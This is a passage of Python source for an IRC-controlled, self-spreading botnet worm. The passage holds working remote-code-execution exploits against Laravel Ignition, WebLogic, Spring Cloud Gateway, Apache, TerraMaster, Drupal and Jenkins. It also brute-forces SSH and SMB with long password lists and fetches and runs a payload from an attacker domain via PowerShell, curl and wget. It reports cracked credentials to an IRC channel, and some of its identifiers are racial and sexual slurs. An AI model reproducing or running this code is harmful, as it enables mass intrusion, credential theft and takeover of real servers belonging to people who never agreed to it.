        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1"]
        self.aosidheh={ "Accept": "application/json", "User-Agent": random.choice(self.GbASkEbE) }
        self.laravel={ "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters":{ "variableName":"cm0s", "viewFile":"" } }
        self.threadids=[]
        threading.Thread(target=self.dajsJgBT, args=()).start()
        for thrid in range(0,int(os.environ['NUMBER_OF_PROCESSORS'] if os.name=="nt" else os.sysconf('SC_NPROCESSORS_ONLN'))*16):
            self.threadids.append([0,[]])
            self.threadids.append([0,[]])
            try:
                threading.Thread(target=self.worker,args=(thrid,)).start()
            except:
                pass
        self.IRCConnect()
    def recvTimeout(self, sacker, rsize, thetime=8):
        sacker.setblocking(0)
        readydeddy = select.select([sacker], [], [], thetime)
        if readydeddy[0]:
            datadue = sacker.recv(rsize)
            sacker.setblocking(1)
            return datadue
        sacker.setblocking(1)
        return ""
    def clear_log(self, url='', viewFile=''):
        self.laravel['parameters']['viewFile']=viewFile
        lcount=0
        while (urllib2.urlopen(urllib2.Request(url, json.dumps(self.laravel), headers=self.aosidheh), context=self.ctx).getcode() != 200):
            lcount+=1
            if lcount>=10:
                break
        urllib2.urlopen(urllib2.Request(url, json.dumps(self.laravel), headers=self.aosidheh), context=self.ctx)
        urllib2.urlopen(urllib2.Request(url, json.dumps(self.laravel), headers=self.aosidheh), context=self.ctx)
    def create_payload(url='', viewFile=''):
        self.laravel['parameters']['viewFile']=viewFile
        resp=urllib2.urlopen(urllib2.Request(url, json.dumps(self.laravel), headers=self.aosidheh), context=self.ctx)
        try:
            if resp.getcode() == 500 and 'file_get_contents('+viewFile+')' in resp.read():
                return True
            else:
                return False
        except:
            pass
    def convert(self,url='', viewFile=''):
        self.laravel['parameters']['viewFile']=viewFile
        try:
            resp=urllib2.urlopen(urllib2.Request(url, json.dumps(self.laravel), headers=self.aosidheh), context=self.ctx)
            if resp.getcode() == 200:
                return True
        except:
            return False
    def faggged(self, url='', viewFile=''):
        self.laravel['parameters']['viewFile']=viewFile
        try:
            resp=urllib2.urlopen(urllib2.Request(url, json.dumps(self.laravel), headers=self.aosidheh), context=self.ctx)
        except:
            pass
    def generate_payload(self,padding=0):
        global stupidnigeria
        payload=re.sub("", "=00", b64encode('<?php __HALT_COMPILER(); ?>\r\n\xd1\x02\x00\x00\x02\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x00\x00z\x02\x00\x00O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\x00*\x00socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\x00*\x00handler";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\x00*\x00handler";N;s:13:"\x00*\x00bufferSize";i:-1;s:9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;s:11:"FAGGOESHERE";s:5:"level";N;}}s:8:"\x00*\x00level";N;s:14:"\x00*\x00initialized";b:1;s:14:"\x00*\x00bufferLimit";i:-1;s:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"\x00*\x00bufferSize";i:-1;s:9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;s:11:"FAGGOESHERE";s:5:"level";N;}}s:8:"\x00*\x00level";N;s:14:"\x00*\x00initialized";b:1;s:14:"\x00*\x00bufferLimit";i:-1;s:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}\x05\x00\x00\x00dummy\x04\x00\x00\x00]\xcd\x00`\x04\x00\x00\x00\x0c~\x7f\xd8\xa4\x01\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00test.txt\x04\x00\x00\x00]\xcd\x00`\x04\x00\x00\x00\x0c~\x7f\xd8\xa4\x01\x00\x00\x00\x00\x00\x00testtest\x1b\xbb\x95\xb7v\xb0:\xd8\xbd26\x05\xe7\xe7{;\xbcA\xb9(\x02\x00\x00\x00GBMB'.replace("FAGGOESHERE",stupidnigeria.replace('/', '\/').replace('\'', '\\\''))))[3::].replace("==00", "3D=00")
        for i in range(padding):
            payload += '=00'
        return payload
    def exploitravel(self,url):
        path_log='/var/www/html/laravel/storage/logs/laravel.log'
        padding=0
        asjdlksad=self.generate_payload(padding)
        url=url+'/_ignition/execute-solution'
        self.clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
        self.create_payload(url, 'AA')
        self.create_payload(url, asjdlksad)
        lcount=0
        while (not self.convert(url, 'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s'%(path_log))):
            lcount += 1
            if lcount > 9:
                break
            self.clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
            self.create_payload(url, 'AA')
            padding += 1
            payload=self.generate_payload(padding)
            self.create_payload(url, payload)
        self.faggged(url, 'phar://%s'%(path_log))
    def sshTesTpw(self, ip, passwd):
        try:
            try:
                ssh = paramiko.SSHClient()
            except:
                import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip,port=22,username=passwd.split(":")[0],password=passwd.split(":")[1],allow_agent=False,look_for_keys=False,key_filename=None,timeout=3)
            self.commSock.send("PRIVMSG %s :CRACKED - %s:%s\n" % (self.mychan,ip,passwd))
            ssh.exec_command(stupidnigeria)
            time.sleep(20)
            ssh.close()
            return 1
        except paramiko.ssh_exception.BadAuthenticationType:
            return 1
        except paramiko.ssh_exception.AuthenticationException:
           return 0
        except:
           return 1
    def smbTesTPW(self,smbtarg,ussername,passsword,thrid):
        global mydomain
        self.threadids[thrid][0] += 1
        try:
            srvhandle=_0penSCManagerA(smbtarg)
            try:
                srvhandle,_=CreeaateServiceA(handle,randomstring(random.randint(4,16)),randomstring(random.randint(4,16)),0xF01FF,0x00000020,0x00000002,0x00000001,"C:\\Windows\\System32\\cmd.exe /C @powershell -NoProfile -ExecutionPolicy unrestricted -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/manthey/pyexe/releases/download/v18/py27.exe','python.exe'); (New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/setup.py','setup.py');\" & .\\python.exe setup.py".replace("DOMAIN",mydomain),"CDROM",None,".\\"+username,password)
                self.commSock.send("PRIVMSG "+self.AviaeEPO+" :SMB - "+smbtarg+":"+ussername+":"+passsword+"\n")
                self.threadids[thrid][1]=[username,password]
                try:
                    StaartServiceA(srvhandle)
                except:
                    pass
                DeletService(srvhandle)
            except:
                pass
        except:
            pass
        self.threadids[thrid][0] -= 1
    def esmbBrute(self,smbtarg,thrid):
        usernmes=["Administrator","admin","User","test"]
        passwds=["","123456","password","12345","passport","diablo","alpha","12345678","1","zxcvbnm","trustno1","shit","monkey","hello","elite","abc123","windows","thunder","thomas","therock","sony","robert","random","qwerty","qazwsx","presario","piff","pierre","peace","pana","ninja","music","mike","michael","menace","master","maria","letmein","lemmein","jericho","jamesbond","hacker","fuckyou","frogfrog","fish","eminem","dragons","dantheman","buster","brooklyn","bodhisattva","blue","blowme","beebop","bean21","baseball","666666","485112","187187","1234","1134","11111111","zzzzzz","zilch","zerocool","zapatista","zahra","z3r0","yumes","yoyo","yo","yellow","xyz","xxxxxxxx","xwings","xuser","xtc","wutang","wunder","wouter1","worthless","wonder","winnie","winhex","windwalker","willie","william","wildman","wildcard","wild","whore","whizzkids","whatever1","whatever","wetwilly","weed","webcam1","waterloo","warzone","warez","wantto","wankers","wallace","vt","voodoo","vette1","valentine","usagi","unregistered","union","underdog","uffaaa","typhoon","tyler2","ty98","twf","tusse","turky","turbo","tuesday","truk","troubles","trottel","trinitron","tricia44","tricia","tribute","tribe","toshiba","toad","tippy","tikki","tigger","tif","three","therock1","thend","themaster","thedog","thatisit","thailand","testtest","termite","terblo","temp","telephone","teacher1","tartarus","talon6","talamar","taju","taboo1","sword","surfing","surfer22","superman","sunflower","suckit","sublime","stumptown","stuffies","stinky","steven","stefan","squaresoft","square","spyderco","spug","spongebob","spikerip","sourcecode","sofie","smokey","smith","smigul","slovenia","slipknot","slampa","skar23","sithlord","single1","sindy28","sinder","simple","silverwing","siberia","shortcut","shithead","shibboleth","shiatsu","shearer9","shareef","shaolin","shaft","shadow","seymour","seven","semperfi","sekhmet","seifer","security","sebastian","se7en","scooter","scooby","schumacher","schiess","sbbut","satire","satan","sane","sandman","sanderson","samuel","same","sambuca","sadbuttrue","sabina","s3cr3t","s1mpl3","roze","rootbeer","romece","rockstar","roberto","robbie","revilo","rentrap","rellik","reliable","relena","reimann","register","redwater","reddragon","redbull","redalert","reaver","raza","raytel","rayann","rawnewdlz","rawiswar","ravens","rascal","rapture","raptor17","rapalA","rannug","rani","randhir","rambo","rainman","rainbow","rain","radioactive","radio7","radar","rachel","qwertyuiop","qwertyui","qwerty23","qwaszx","qqw","qazwsxedc","q1w2e3","pussy","prowler","provost","predator","pppp","powers","powell","poser","poop","pomme","poiuytrewq","poiuytre","plop","please","playstation","plat","pitbull","pitagoras","pimpin","pillow","pilgrim","phunky","phreek","phoenix","philly","phate","pharma","pgpgpg","peterla","peterb","perfect","pepon","pennys","peewee","peebee","peaches","peach","passwd","parham","paranoid","paradise","pantera6","padraig","ozzy","owell","override","oralia","oquendo","openit","oliver","oldenberg","number1","noway","nothing","nono","none","nobody","nn3","ninnin","nilsson","nikolas","nikita","nihongo","nightnight","nexus6","newnew","newdog","newbee","nevernever","nermy","neontrain","nenga","nedkelly","nbb","nayaran","naxos","navyseal","nautilus","nadia","n2deep","n0ne","mystery","mushki","mowers","moviestar","movies","motocross","moshi","moscow","moose","moon","money","mommy","mommom","moltar","moloch","mmoshi","mitabrev","miriam","mind","midgar","michelle","metoo","member","melody","melo1977","meathead","maxell","mattp","matrix","mathers","mary","marley","marisol","manutd","mangie","mamma","makeitso","magic1","maggie1","lulop","lowlow","love","louise","lopez","looga","long","logjam","locks","liquor","lionking4","lionheart","linux","limpbizkit","lilian1","lightsabre","lightning","lexmark","lenong","lemon","lautrec","lasher","lansing","lanparty","lancaster","ladybug","kyle11","kut","kuffs","krap","kookies","kompas","kodecypher","koalabear","kmp80","kitty","kitten","kirin","kingking","kima","killer1","killer","kewin","kenner","kcampbell","katrina","kate","kameler","kamari","kaizers","julie","jujai","jstevens","joris","jonah","jon","jollyrogers","jojojo","john","joe","jimboy","jhi","jester","jessica","jeremy","jennifer","jenn","jbull","jaybee","jaws","javert","jasper","jasonl","izzy","ivanaj","itisme","ireland","instinct","insane","innovision","inlove","inimulli","imzadi","iloveyou","ih","iforgot","idontknow","idiot","iamgod","hunter","huh","hugo","hubert","hop","honor","honda","homes","homerjay","holly","hockey","hmb","hitman","hilda","hightimes","hi","helpme","helena","heineken","hehehe","hawley","hatred","hardcore","happy","happiness","hanging","handle","halflife","hak95","hacking","hackhack","hackers","gyros","guy","gustavo","gunshot","gundam","guitar","grynn","greenday","green","greece","grassroots","google","goldfish","goldberg","gloria","glasaal","give","girl","ginger","gibson","get316","george","genesis","gator","gateway","gangster","gandalf","gamma","gaming","fuzzball","fuguz","fuckyoutoo","fuckoff","fucker","front242","freshmeat","freedom1","freedom","frederik","freddie","frasse","foxman","flywheel","flames","fireman","ffffff","felix","fear","fatboy","fart","fantasy","fallenangel","faith","fairmont","fabrizio","eyes","exploit","evil1","eu86t","etherton","estelle","eroica","enterprise","enigma","elitist","elf1","element","elegance","edwards","eat","eaglescout","dumbass","duck","drsmith","drowssap","drevil","drdre","draziw","dragonfly","doritos","doom","doggys","ditu","disowned","dingle","dimension","diglet","dick","diablo2","deville","ders1","default","deejay","decent","death","deadman","dbzdbz","davy","david1","dartagnan","darkdog","dark","danny20","dalgas","dabomb","cszwed","cstrike","crystalscan","crystal","cricket","crepitus","crashand","crappo","crapper","crap","crackers","cows","cow","coushin","courtney","cosmo","corsair","corinna","cooldude","coold","cool","continuim","computer1","computer","colleen","coffman","codetracker","cobra","clent","claudius","clark","cisco123","cimbom","christophe1","chilli","chessino","chefchef","chazz1","chatter1","change","champion","champ","challenger","ccsf","ccccc","cc","cathy","carter","carnival","caramba","candy","canada","cambridge","camaro","caliente","cafer","cacca","by8540","butthead","butterfly1","butterfly","busto","burt","burritos","bugsfix","budale","buba","broman","brittany","brian","brenda","breanna","brazil","brambles","bottle","boston","bonzie","boll","bobos","bobby","blueberries","blubb","blitz","blahblah","bitterwoo","birchard","bimbo1","biggame","bible","bibbob","beta","bertje","benbob","bellix","becks","bear","bathroom","banzai","bandit","bailey","badass","b16a1","awed","aviation","avatar","auscam","auckland","athlon","asterix","ast","asskicker","asker","asinat","archdevils","anonymous","angels","anfernee","andyb","andrea","anders","anarchy1","amirman","amireal1","althea","alpha1","alisha","alien","ali","alexande","albino","airplane","affinity","adolf","adios","adam04","acheron","aceman","acef","abide","abcda","aaaaaa","ZZZZZ","Trisha","Tetris","TULLE","TROY","TRITON","THEROCK","Sambrook","SAMUEL","SAMSUNG","Roland","Redwings","Qwerty","Paulan1","Paul19","PROTON","PRIMITIVE","Millenium","Melvin","MERT","LarsLars","Jonathan","Hotties","Hanibal","HUNTER","Goop","Godsent","Fugazi","Dragon","Digital","Cyres","Cyber","CowboyBebop","Centauri","Caspar","CORNER","Berliner","Bearfoot","Annemarie","99999","987654321","9770","975384","9177","898989","895623","8816","822822","811820","800070","786110","7777","777","741235","74123","71380","64897","6148","61284","55dflw","545937","523470","486570","48469","4462","4402020","437782","350450","3425283","33305","314159","31337","2cool4u","29385098","284812","280472","261127","25802580","25101986","24911","24","2353535","2320111","23","2227","2222","220587","2203","2132","2122","2040","2000","1spyder","1qaz","1q2w3e","1izznit","1QAZ","19840824","1984","1977","1969","183461","180155","1782","170120","164810","159951","1568","1547","1488","14807","147896","1340lu","1313","123ccc","123789","1234566","123123","123","122782","122386","120981","120973","114182","112358","112233","111222","101183","090284","072160","062","05071984","0502","0411","027702","022367","019210","011386","007","0009","0000","00"]
        random.shuffle(passwds)
        for ussername in usernmes:
            for passsword in passwds:
                while self.threadids[thrid][0] >= 32:
                    time.sleep(0.001)
                try:
                    threading.Thread(target=self.smbTesTPW,args=(smbtarg,ussername,passsword,thrid,)).start()
                except:
                    pass
                if self.threadids[thrid][1] != []:
                    return self.threadids[thrid][1]
        return "",""
    def exploit(self, ip, srvport, thrid):
        global mydomain,stupidnigeria,winbox
        self.scanips.append(ip)
        if srvport == 22:
            passwords = [
                "root:root",
                "admin:admin",
                "admin:1234",
                "root:toor",
                "root:admin",
                "root:12345678",
                "root:123456",
                "root:webadmin",
                "admin:webserver",
                "admin:12345678",
                "root:password",
                "root:12345678",
                "root:1234",
                "root:12345",
                "root:qwerty",
                "support:support",
                "student:student",
                "root:letmein",
                "admin:pfsense",
                "root:freenas",
                "root:test",
                "root:passwd",
                "debian:debian",
                "ftpuser:steriskftp",
                "root:sonicwall",
                "usuario:usuario",
                "admin:superuser",
                "admin:admin123",
                "root:blackarch",
                "root:default",
                "root:toor",
                "root:letmein",
                "user:password",
                "user:user",
                "guest:guest",
                "ftp:ftp",
                "irc:irc",
                "ircd:ircd",
                "apache:apache",
                "tomcat:tomcat",
                "oracle:oracle",
                "mysql:mysql",
                "postgresql:postgresql",
                "postgres:postgres",
                "postfix:postfix",
                "root:server",
                "root:ubuntu",
                "ubuntu:ububtu",
                "root:debian",
                "root:alpine",
                "root:ceadmin",
                "root:indigo",
                "root:linux",
                "root:rootpasswd",
                "root:timeserver",
                "root:webadmin",
                "root:webmaster",
                "root:Passw@rd",
                "pi:raspberry",
                "root:alpine"
            ]
            for passwd in passwords:
                if self.sshTesTpw(ip, passwd):
                    return self.scanips.remove(ip)
            for pwlength in [3,4]:
                for passwd in itertools.permutations('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@$',pwlength):
                    pwtest="".join(passwd)
                    if self.sshTesTpw(ip, "root:"+pwtest):
                        return self.scanips.remove(ip)
            self.scanips.remove(ip)
        elif "443" in str(srvport):
            url = "https://"+ip+":"+str(srvport)
        elif srvport == 445:
            userfag,passwd=self.esmbBrute(ip,thrid)
            if userfag != "":
                ahdjs=ip+"/16"
                (addrString,cidrString)=ahdjs.split("/16")
                ipaddr=addrString.split('.')
                cidrR=int(cidrString)
                netmask=[0,0,0,0]
                for i in range(cidrR):
                    netmask[i/8]=netmask[i/8]+(1 << (7 - i % 8))
                netip=[]
                for i in range(4):
                    netip.append(int(ipaddr[i]) & netmask[i])
                broad=list(netip)
                brange=32 - cidrR
                for i in range(brange):
                    broad[3 - i/8]=broad[3 - i/8]+(1 << (i % 8))
                net_mask=".".join(map(str,netmask))
                from_ip=".".join(map(str,netip))
                to_ip=".".join(map(str,broad))
                startipaddr=struct.unpack('>I',socket.inet_aton(".".join(map(str,netip))))[0]
                endipaddr=struct.unpack('>I',socket.inet_aton(".".join(map(str,broad))))[0]
                for ip in range(startipaddr,endipaddr):
                    try:
                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        s.settimeout(0.37)
                        s.connect((ip,445))
                        s.close()
                        self.smbTesTPW(ip,userfag,passwd)
                    except:
                        pass
            try:
                self.scanips.remove(ip)
            except:
                pass
            return
            url = "http://"+ip+":"+str(srvport)
        myuseragent = random.choice(self.GbASkEbE)
        if srvport == 7001:
            try:
                if "WebLogic Server Administration Console Home" in urllib2.urlopen(urllib2.Request(url+'/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi")', headers={'User-Agent' : myuseragent})).read():
                    form_data_="_nfpb=false&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread=(weblogic.work.ExecuteThread)Thread.currentThread();\r\nweblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();\r\njava.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");\r\nfield.setAccessible(true);\r\nObject obj = field.get(adapter);\r\nweblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj);\r\nString cmd = req.getHeader(\"cmd\");\r\nString[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\",\"/c\", cmd} : new String[]{\"/bin/sh\",\"-c\", cmd};\r\nif (cmd != null) {\r\n    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\\\A\").next();\r\n    weblogic.servlet.internal.ServletResponseImpl res=(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);\r\n    res.getServletOutputStream().writeStream(new weblogic.xml .util.StringInputStream(result));\r\n    res.getServletOutputStream().flush();\r\n    res.getWriter().write(\"\");}executeThread.interrupt();\");"
                    for cmd in [stupidnigeria, winbox]:
                        headersnig = {
                            'cmd': cmd,
                            'Content-Type':'application/x-www-form-urlencoded',
                            'User-Agent':myuseragent, 
                            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Connection':'close',
                            'Accept-Encoding':'gzip,deflate',
                            'Content-Type':'application/x-www-form-urlencoded'
                        }
                        try:
                            urllib2.urlopen(urllib2.Request(url+"/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal", data=form_data_, headers={headersnig}))
                        except:
                            pass
            except:
                pass
        headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': myuseragent,
            'Content-Type': 'application/json'
        }
        headers2 = {
            'User-Agent': myuseragent,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        val = random.randint(100000, 999999)
        phprceb64=b64encode("passthru('" + stupidnigeria + "');")
        randgetvar = randomstring(random.randint(8,12))
        gateway = str(val)
        payload = '''{\r
          "id": "''' + gateway + '''",\r
          "filters": [{\r
            "name": "AddResponseHeader",\r
            "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"/bin/sh\\",\\"-c\\",\\"echo ''' + randgetvar + '''; ''' + stupidnigeria + ''';\\"}).getInputStream()))}"}\r
            }],\r
          "uri": "http://example.com",\r
          "order": 0\r
        }'''
        try:
            re1 = urllib2.urlopen(urllib2.Request(url + "/actuator/gateway/routes/" + gateway, data=payload, headers=headers1), context=self.ctx)
            re2 = urllib2.urlopen(urllib2.Request(url + "/actuator/gateway/refresh", headers=headers2, method="DELETE"), context=self.ctx)
            re3 = urllib2.urlopen(urllib2.Request(url + "/actuator/gateway/routes/" + gateway, headers=headers2), context=self.ctx).read()
            re4 = urllib2.urlopen(urllib2.Request(url + "/actuator/gateway/routes/" + gateway, headers=headers2), context=self.ctx)
            re5 = urllib2.urlopen(urllib2.Request(url + "/actuator/gateway/refresh", headers=headers2, method="POST"), context=self.ctx)
            if randgetvar in re3 and "route_id" in re3:
                self.commSock.send("PRIVMSG %s :%s\n" % (self.mychan,"SPRINGCLOUD->" + url))
        except:
            pass
        try:
            if "VULN" in urllib2.urlopen(urllib2.Request(url+"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh", "echo VULN;"+stupidnigeria, headers={"User-Agent" : myuseragent})).read():
                self.commSock.send("PRIVMSG %s :APACHE - %s" % (self.mychan, url))
        except:
            pass
        try:
           s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.settimeout(0.5)
           s.connect((ip, srvport))
           if url.startswith("https"):
               s=ssl.wrap_socket(self.commSock)  
           s.send("GET / HTTP/1.1\nHost:" + ip + ":" + str(srvport) + "Accept: */*\nUser-Agent: " + myuseragent + "\nConnection: keep-alive\n\n")
           srvheaders=s.recv(8912)
           s.close()
           if "Server: TNAS" in srvheaders or "X-Powered-By: TerraMaster" in srvheaders:
               try:
                   urllib2.urlopen(urllib2.Request(url+'/include/exportUser.php?type=3&cla=application&func=_exec&opt=php%20-r%20%22file_put_contents%28%5C%22setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F' + mydomain + '%2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2F' + mydomain + '%2Fsetup%20-O%3Bcurl%20http%3A%2F%2F' + mydomain + '%2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F' + mydomain + '%2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2F' + mydomain + '%2Fsetup%20-O%20setup%3Bwget%20http%3A%2F%2F' + mydomain + '%2Fsetup.py%20-O%20setup.py%3Bchmod%20777%20setup.py%3Bchmod%20777%20setup%3Bpython2%20setup.py%7C%7Cpython2.7%20setup.py%7C%7Cpython%20setup.py%7C%7C.%2Fsetup.py%7C%7C.%2Fsetup', "", headers={"User-Agent" : myuseragent}), context=self.ctx)
               except:
                   pass
               try:
                   urllib2.urlopen(urllib2.Request(url+'/include/makecvs.php?Event=%60php%20-r%20%22file_put_contents%28%5C%22setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F' + mydomain + '%2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2F' + mydomain + '%2Fsetup%20-O%3Bcurl%20http%3A%2F%2F' + mydomain + '%2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F' + mydomain + '%2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2F' + mydomain + '%2Fsetup%20-O%20setup%3Bwget%20http%3A%2F%2F' + mydomain + '%2Fsetup.py%20-O%20setup.py%3Bchmod%20777%20setup.py%3Bchmod%20777%20setup%3Bpython2%20setup.py%7C%7Cpython2.7%20setup.py%7C%7Cpython%20setup.py%7C%7C.%2Fsetup.py%7C%7C.%2Fsetup%60', "", headers={"User-Agent" : myuseragent}), context=self.ctx)
               except:
                   pass
           if "X-Drupal-Cache" in srvheaders:
               hhhcmd = 'echo ---- & ' + stupidnigeria
               niggaload = { "link": [ { "value": "link", "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000" "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"" "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:" "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";" "s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000" "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000" "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"" "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}" "".replace('|size|', str(len(hhhcmd))).replace('|command|', hhhcmd) } ], "_links": { "type": { "href": url + '/rest/type/shortcut/default' } } }
               try:
                    if "HIT" not in urllib2.urlopen(urllib2.Request(url + "/node/" + str(node_id) + "?_format=hal_json", json.dumps(niggaload), headers={"Content-Type" : "application/hal+json"}), context=self.ctx).headers.get("X-Drupal-Cache"):
                        self.commSock.send("PRIVMSG %s :DRUPAL - %s" % (self.mychan, url))
               except:
                    pass
               try:
                    drupal={
                        'form_id' :   
                        'user_pass',
                      '_triggering_element_name' : name
                    }
                    urllib2.urlopen(urllib2.Request(url+'/?q=user/password&name%5b%23post_render%5d%5b%5d=assert&name%5b%23markup%5d=eval%28base64_decode%28%29%22'+phprceb64 +'%22%29%3b&name%5b%23type%5d=markup', urllib.urlencode(drupal), headers={'User-Agent' : myuseragent}), context=self.ctx)
               except:
                    pass
           if "Jenkins" in srvheaders:
               try:
                   urllib2.urlopen(urllib2.Request(url + "/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/", "sandbox=True&value=class abcd{abcd(){'" + stupidnigeria + "'.execute()}}", headers={"User-Agent" : myuseragent, "Authorization-Basic" : b64encode("jenkins:jenkins")}), context=self.ctx)
               except:
                   pass
           if "Big-IP" in srvheaders:
               try:
